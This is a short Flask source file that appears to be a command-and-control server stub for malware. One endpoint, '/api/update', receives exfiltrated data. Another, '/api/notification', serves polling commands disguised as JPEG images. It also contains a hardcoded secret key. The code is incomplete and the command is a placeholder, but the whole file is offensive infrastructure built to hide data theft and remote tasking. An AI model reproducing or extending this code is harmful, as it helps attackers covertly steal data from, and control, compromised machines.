from flask import Flask, flash, request, redirect, url_for,send_file
from encryption import *
import io

app = Flask(__name__)
app.secret_key = b'\xed\xa1\x80\t\xa5n_\xcd\xb7\xfc\x83\xa20\x13]\x9b\xfe\xf3\xc4\xd3\xa5'

# tentatively receive data from exfil
@app.route('/api/update',methods=['POST'])
def recv_data():
    data = request.data
    print(data)

# provides commands for poll
@app.route('/api/notification',methods=['GET'])
def provide_command():
    return send_file(io.BytesIO(b'\x00ABCDEF'),mimetype="image/jpg")